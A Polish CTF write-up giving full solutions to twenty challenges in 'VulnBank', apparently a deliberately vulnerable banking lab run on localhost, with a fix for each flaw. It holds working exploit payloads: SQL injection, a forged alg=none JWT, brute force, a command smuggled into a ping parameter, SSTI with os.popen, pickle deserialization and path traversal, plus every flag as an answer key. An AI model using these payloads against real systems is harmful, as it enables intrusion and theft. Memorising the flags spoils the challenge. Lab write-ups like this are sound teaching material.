# VulnBank — Rozwiązania (Write-upy)

## UWAGA: Ten plik zawiera pełne spoilery

---

## Przygotowanie — konto w portalu CTF

Przed submitowaniem flag musisz mieć konto w portalu CTF (osobne od kont bankowych).

```bash
# Zarejestruj gracza
curl -X POST http://localhost:5000/api/ctf/auth/register \
  -H "Content-Type: application/json" \
  -d '{"nickname":"h4x0r","email":"gracz@example.com","password":"haslo123"}'

# Lub jeśli masz już konto — zaloguj się
CTF_TOKEN=$(curl -s -X POST http://localhost:5000/api/ctf/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"gracz@example.com","password":"haslo123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Token do bankowych endpointów — przyda się w A01, A05, A13-A18
BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

Submit flagi używa CTF tokenu (`$CTF_TOKEN`), nie bankowego:

```bash
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{...}"}'
```

---

## A01 — Broken Access Control (IDOR)
**Flaga:** `PWR{idor_account_takeover}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
`GET /api/accounts/<id>` nie weryfikuje czy konto należy do zalogowanego użytkownika.

### Exploit

```bash
# 1. Zaloguj się do banku jako bob
BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. IDOR: zmień ID na 1 (konto alice)
curl -H "Authorization: Bearer $BANK_TOKEN" http://localhost:5000/api/accounts/1
# W odpowiedzi: "internal_note": "PWR{idor_account_takeover}"

# 3. Submit w portalu CTF
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{idor_account_takeover}"}'
```

### Naprawa
```python
account = Account.query.get_or_404(account_id)
if account.user_id != int(get_jwt_identity()):
    return jsonify({"error": "Brak dostępu"}), 403
```

---

## A02 — Security Misconfiguration
**Flaga:** `PWR{debug_config_exposed}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
Endpoint `/api/debug/config` dostępny bez autoryzacji zwraca `os.environ()`.

### Exploit

```bash
curl http://localhost:5000/api/debug/config | python3 -m json.tool | grep FLAG
# "FLAG_A02": "PWR{debug_config_exposed}"

# Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{debug_config_exposed}"}'
```

### Naprawa
Usuń endpoint przed wdrożeniem lub zabezpiecz `@jwt_required()` + `require_admin()`.

---

## A03 — Supply Chain Failures
**Flaga:** `PWR{vulnerable_dependency_found}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
PyYAML 5.3.1 w `requirements.txt` — CVE-2020-14343. Endpoint `/api/debug/dependencies` ujawnia listę pakietów z CVE.

### Exploit

```bash
curl http://localhost:5000/api/debug/dependencies \
  | python3 -c "
import sys, json
for p in json.load(sys.stdin)['packages']:
    if 'flag' in p:
        print(p['flag'])
"
# PWR{vulnerable_dependency_found}
```

### Naprawa
Zaktualizuj PyYAML do `>=6.0.0`. Dodaj `pip-audit` do CI/CD.

---

## A04 — Cryptographic Failures (MD5)
**Flaga:** `PWR{md5_no_salt_cracked}`  
**Trudność:** medium | **Punkty:** 150

### Podatność
Hasła hashowane MD5 bez soli. Endpoint `/api/admin/backup` zwraca hashe.

### Exploit

```bash
# 1. Zdobądź admin token przez A08 (patrz niżej)
# 2. Pobierz backup
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:5000/api/admin/backup \
  | python3 -c "
import sys, json
for u in json.load(sys.stdin):
    if u['email'] == 'charlie@vulnbank.pl':
        print(u['password_hash'])
"
# Hash: 5e201833a6a6462cc668004937b4f857

# 3. Wklej na crackstation.net → charlie2024

# 4. Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{md5_no_salt_cracked}"}'
```

### Naprawa
Użyj `bcrypt` lub `argon2` zamiast MD5.

---

## A05 — SQL Injection
**Flaga:** `PWR{sqli_transactions_leaked}`  
**Trudność:** medium | **Punkty:** 150

### Podatność
`GET /api/transactions/search?q=` — string concatenation w SQL.

### Exploit

```bash
BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# UNION SELECT — wyciągnij flagę z tabeli flags
PAYLOAD="' UNION SELECT 1, 2, 3, 0, flag_value, NOW() FROM flags WHERE challenge_id='A05'--"

curl -G "http://localhost:5000/api/transactions/search" \
  -H "Authorization: Bearer $BANK_TOKEN" \
  --data-urlencode "q=$PAYLOAD"
# W odpowiedzi: "title": "PWR{sqli_transactions_leaked}"
```

### Naprawa
```python
result = db.session.execute(
    db.text("SELECT ... WHERE title LIKE :q"),
    {"q": f"%{q}%"}
)
```

---

## A06 — Insecure Design (Password Reset)
**Flaga:** `PWR{insecure_password_reset}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
Reset hasła wymaga tylko PESELU. PESEL widoczny przez IDOR (A01).

### Exploit

```bash
# PESEL alice w seeds: 90010112345

# 1. Zresetuj hasło alice znając jej PESEL
curl -X POST http://localhost:5000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@vulnbank.pl","pesel":"90010112345","new_password":"hacked123"}'
# W odpowiedzi: "flag": "PWR{insecure_password_reset}"

# 2. Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{insecure_password_reset}"}'
```

### Naprawa
Użyj bezpiecznych tokenów wysyłanych na email z czasem wygaśnięcia.

---

## A07 — Authentication Failures (Brute-force)
**Flaga:** `PWR{no_ratelimit_bruteforce}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
Brak rate-limitingu na `/api/auth/login`.

### Exploit (curl + bash)

```bash
PASSWORDS=("123456" "password" "12345678" "qwerty" "abc123" "monkey" "letmein" "dragon" "master" "password123")

for PASS in "${PASSWORDS[@]}"; do
  RESULT=$(curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"bob@vulnbank.pl\",\"password\":\"$PASS\"}")
  if echo "$RESULT" | grep -q '"token"'; then
    echo "HASŁO: $PASS"
    BANK_TOKEN=$(echo "$RESULT" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
    break
  fi
done
# HASŁO: password123

# Po zdobyciu tokena — pobierz flagę z profilu
curl -s -H "Authorization: Bearer $BANK_TOKEN" http://localhost:5000/api/profile/
# "flag": "PWR{no_ratelimit_bruteforce}"
```

### Exploit (Burp Suite Intruder)
1. Przechwycić POST /api/auth/login
2. Intruder → Sniper, zaznacz `password`
3. Payload: rockyou.txt top 100
4. Filtruj po statusie 200

### Submit

```bash
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{no_ratelimit_bruteforce}"}'
```

### Naprawa
```python
@limiter.limit("5 per minute")
def login():
    ...
```

---

## A08 — JWT None Algorithm Bypass
**Flaga:** `PWR{jwt_tampered_admin}`  
**Trudność:** medium | **Punkty:** 150

### Podatność
Backend akceptuje JWT z `alg=none` — token bez podpisu.

### Exploit (Python)

```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "2", "is_admin": True, "email": "bob@vulnbank.pl", "iat": 9999999999}

def b64url(d):
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(',',':')).encode()
    ).rstrip(b'=').decode()

token = f"{b64url(header)}.{b64url(payload)}."
print(token)
```

```bash
# Wyślij token do panelu admina
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/admin/dashboard
# Odpowiedź zawiera flagę

# Submit przez portal CTF
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{jwt_tampered_admin}"}'
```

### Naprawa
```python
app.config["JWT_DECODE_ALGORITHMS"] = ["HS256"]
```

---

## A09 — Logging & Alerting Failures
**Flaga:** `PWR{logs_exposed_no_auth}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
`GET /api/admin/logs` jest publiczny i zwraca logi bez autoryzacji. W odpowiedzi
pojawia się wpis zawierający flagę.

### Exploit

```bash
curl http://localhost:5000/api/admin/logs | python3 -m json.tool | grep PWR
# "2024-01-15 08:23:11 ERROR Backup admin password: PWR{logs_exposed_no_auth}"

# Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{logs_exposed_no_auth}"}'
```

### Naprawa
```python
@admin_bp.route("/logs")
@jwt_required()
def get_logs():
    err = require_admin()
    if err: return err
    # NIE loguj haseł ani sekretów w logach:
    logger.warning(f"Failed login for {email}")  # bez password!
```



## A10 — Exceptional Conditions (Stack Trace)
**Flaga:** `PWR{stacktrace_db_url_leaked}`  
**Trudność:** easy | **Punkty:** 100

### Podatność
Flask `DEBUG=True` + brak obsługi wyjątku → stack trace Werkzeug z zmiennymi lokalnymi.

### Exploit

```bash
# Wywołaj ValueError przez błędny parametr
curl "http://localhost:5000/api/loans/calculate?amount=abc&rate=2" | grep -o "PWR{[^}]*}"
# PWR{stacktrace_db_url_leaked}

# Lub w przeglądarce:
# http://localhost:5000/api/loans/calculate?amount=abc&rate=2
# → interaktywny debugger Werkzeug z zmienną db_url

# Submit
curl -X POST http://localhost:5000/api/ctf/flags/check \
  -H "Authorization: Bearer $CTF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"flag":"PWR{stacktrace_db_url_leaked}"}'
```

Zmienna `db_url` w stack trace:
```
postgresql://vulnbank:PWR{stacktrace_db_url_leaked}@db/vulnbank
```

### Naprawa
```python
try:
    amount = float(request.args.get("amount"))
except ValueError:
    return jsonify({"error": "Nieprawidłowy parametr"}), 400
# + FLASK_DEBUG=false w produkcji
```

---

## A11 — Open Redirect
**Flaga:** `PWR{open_r3d1rect_phi1sh1ng_v3ct0r}`
**Trudność:** easy | **Punkty:** 100

### Podatność
Endpoint `/api/challenges/a11/redirect?next=` przekierowuje na dowolny URL
bez walidacji, a `/api/challenges/a11/flag` ufa cookie ustawionemu przez redirect.

### Exploit

```bash
curl -c cookies.txt -L \
  "http://localhost:5000/api/challenges/a11/redirect?next=/api/challenges/a11/flag"

curl -b cookies.txt http://localhost:5000/api/challenges/a11/flag
# {"flag":"PWR{open_r3d1rect_phi1sh1ng_v3ct0r}", ...}
```

### Naprawa
Waliduj docelowy URL, najlepiej używając whitelisty dozwolonych ścieżek.

---

## A12 — SSRF
**Flaga:** `PWR{ss4f_int3rnal_s3rvice_expos3d}`
**Trudność:** medium | **Punkty:** 150

### Podatność
`/api/challenges/a12/fetch?url=` wykonuje request po stronie serwera do dowolnego URL.

### Exploit

```bash
curl "http://localhost:5000/api/challenges/a12/fetch?url=http://127.0.0.1:5000/api/challenges/a12/internal"
```

### Naprawa
Blokuj adresy prywatne i loopback, a najlepiej korzystaj z whitelisty hostów.

---

## A13 — Command Injection
**Flaga:** `PWR{c0mm4nd_1nj3ct10n_rce}`
**Trudność:** hard | **Punkty:** 200

### Podatność
`/api/challenges/a13/ping?host=` składa komendę shellową z niesanityzowanego parametru.

### Exploit

```bash
curl http://localhost:5000/api/challenges/a13/setup

curl -H "Authorization: Bearer $BANK_TOKEN" \
  "http://localhost:5000/api/challenges/a13/ping?host=127.0.0.1;cat /app/flag_rce.txt"
```

### Naprawa
Nie używaj `shell=True`; przekazuj argumenty jako listę i waliduj input.

---

## A14 — Mass Assignment
**Flaga:** `PWR{m4ss_4ss1gnm3nt_pr1v_3sc}`
**Trudność:** medium | **Punkty:** 150

### Podatność
`PATCH /api/challenges/a14/profile/update` przypisuje wszystkie pola z JSON-a
bez whitelisty, więc można ustawić `is_admin=true`.

### Exploit

```bash
curl -X PATCH http://localhost:5000/api/challenges/a14/profile/update \
  -H "Authorization: Bearer $BANK_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"is_admin": true}'

curl -H "Authorization: Bearer $BANK_TOKEN" \
  http://localhost:5000/api/challenges/a14/secret
```

### Naprawa
Przyjmuj tylko dozwolone pola i ignoruj resztę JSON-a.

---

## A15 — Path Traversal
**Flaga:** `PWR{p4th_tr4v3rs4l_s3cr3t_r34d}`
**Trudność:** medium | **Punkty:** 150

### Podatność
`/api/challenges/a15/report?name=` skleja ścieżkę bez normalizacji.

### Exploit

```bash
curl http://localhost:5000/api/challenges/a15/setup
curl "http://localhost:5000/api/challenges/a15/report?name=../secret/flag.txt"
```

### Naprawa
Użyj `realpath()` i sprawdzaj, czy wynik nadal znajduje się w dozwolonym katalogu.

---

## A16 — Insecure Deserialization
**Flaga:** `PWR{p1ckl3_d3s3r14l1z4t10n_rce}`
**Trudność:** hard | **Punkty:** 200

### Podatność
`/api/challenges/a16/preferences` wykonuje `pickle.loads()` na danych od użytkownika.

### Exploit

```python
import base64
import pickle

class Exploit:
    def __reduce__(self):
        return (str, ("PWR{p1ckl3_d3s3r14l1z4t10n_rce}",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

```bash
PAYLOAD="<wynik z poprzedniego snippet>"

curl -X POST http://localhost:5000/api/challenges/a16/preferences \
  -H "Authorization: Bearer $BANK_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$PAYLOAD\"}"
```

### Naprawa
Nie używaj `pickle` do danych od użytkownika. Zastąp go JSON-em.

---

## A17 — Sensitive Information Disclosure
**Flaga:** `PWR{exposed_internal_token}`
**Trudność:** easy | **Punkty:** 100

### Podatność
Profil zwraca pole `internal_token`, które nie powinno trafiać do klienta.

### Exploit

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@vulnbank.pl","password":"qwerty123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/challenges/a17/profile
```

### Naprawa
Zwracaj tylko pola potrzebne klientowi, bez `internal_token` i podobnych sekretów.

---

## A18 — Server-Side Template Injection
**Flaga:** `PWR{t1mpl4t3_inj3ct10n}`
**Trudność:** hard | **Punkty:** 200

### Podatność
`render_template_string()` renderuje wejście użytkownika bez ograniczeń.

### Exploit

```bash
curl http://localhost:5000/api/challenges/a18/setup

curl -G http://localhost:5000/api/challenges/a18/render \
  -H "Authorization: Bearer $BANK_TOKEN" \
  --data-urlencode "template={{ config.__class__.__init__.__globals__['os'].popen('cat flag_a18.txt').read() }}"
```

### Naprawa
Nie renderuj bezpośrednio szablonów od użytkownika. Używaj bezpiecznego whitelistowanego renderingu.

---

## A19 — Source Maps Leak
**Flaga:** `PWR{S0urc3_M4ps_L34k}`
**Trudność:** easy | **Punkty:** 100

### Podatność
Frontend jest budowany z publicznie dostępnymi source maps, więc oryginalny
kod źródłowy da się odtworzyć z `assets/*.map`.

### Exploit

```bash

Rozwiązanie manualne w przeglądarce:
- Otwórz stronę aplikacji.
- Wciśnij F12, aby otworzyć Narzędzia deweloperskie.
- Przejdź do zakładki Sources (Źródła)/debugger.
- Rozwiń drzewo plików (np. src/App.jsx).
- Przeczytaj oryginalny kod i znajdź komentarz z flagą.


curl http://localhost:3000/assets/index-*.js.map | grep 'PWR{'
```

### Naprawa
Wyłącz source maps w buildzie produkcyjnym i nie serwuj publicznie plików `.map`.

---

## A20 — Race Condition (Double Spend)
**Flaga:** `PWR{race_condition_double_spend}`
**Trudność:** hard | **Punkty:** 200

### Podatność
Dedykowany endpoint `/api/challenges/a20/transfer-race` wykonuje check-then-act:
najpierw pobiera saldo, potem czeka (`sleep(0.55)`), a dopiero potem aktualizuje
konto. Dwa równoległe requesty mogą przeczytać to samo saldo i oba przejść walidację,
co pozwala na podwójne wydanie tych samych środków.

### Exploit

```bash
BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Wykonaj dwa równoległe przelewy 1500 PLN do konta Alice
seq 2 | xargs -P 2 -I{} curl -sS -X POST http://localhost:5000/api/challenges/a20/transfer-race \
  -H "Authorization: Bearer $BANK_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to_iban":"PL00100100100100100100100100","amount":1500,"title":"A20 race {}"}'
```

### Weryfikacja
Jeśli oba requesty przeszły walidację, saldo Boba spadnie poniżej zera, a jedno
z odpowiedzi zwróci flagę w polu `flag`.

### Naprawa
- Zrób walidację salda i aktualizację w jednej transakcji.
- Zablokuj wiersz konta (`SELECT ... FOR UPDATE`) lub użyj atomowego `UPDATE ... WHERE balance >= :amount`.
- Usuń opóźnienie i nie rozdzielaj sprawdzenia od zapisu na różne transakcje.

## Łączny wynik

| # | Flaga | Pkt |
|---|-------|-----|
| A01 | PWR{idor_account_takeover} | 100 |
| A02 | PWR{debug_config_exposed} | 100 |
| A03 | PWR{vulnerable_dependency_found} | 100 |
| A04 | PWR{md5_no_salt_cracked} | 150 |
| A05 | PWR{sqli_transactions_leaked} | 150 |
| A06 | PWR{insecure_password_reset} | 100 |
| A07 | PWR{no_ratelimit_bruteforce} | 100 |
| A08 | PWR{jwt_tampered_admin} | 150 |
| A09 | PWR{logs_exposed_no_auth} | 100 |
| A10 | PWR{stacktrace_db_url_leaked} | 100 |
| A11 | PWR{open_r3d1rect_phi1sh1ng_v3ct0r} | 100 |
| A12 | PWR{ss4f_int3rnal_s3rvice_expos3d} | 150 |
| A13 | PWR{c0mm4nd_1nj3ct10n_rce} | 200 |
| A14 | PWR{m4ss_4ss1gnm3nt_pr1v_3sc} | 150 |
| A15 | PWR{p4th_tr4v3rs4l_s3cr3t_r34d} | 150 |
| A16 | PWR{p1ckl3_d3s3r14l1z4t10n_rce} | 200 |
| A17 | PWR{exposed_internal_token} | 100 |
| A18 | PWR{t1mpl4t3_inj3ct10n} | 200 |
| A19 | PWR{S0urc3_M4ps_L34k} | 100 |
| A20 | PWR{race_condition_double_spend} | 200 |
| **Suma** | | **2700** |

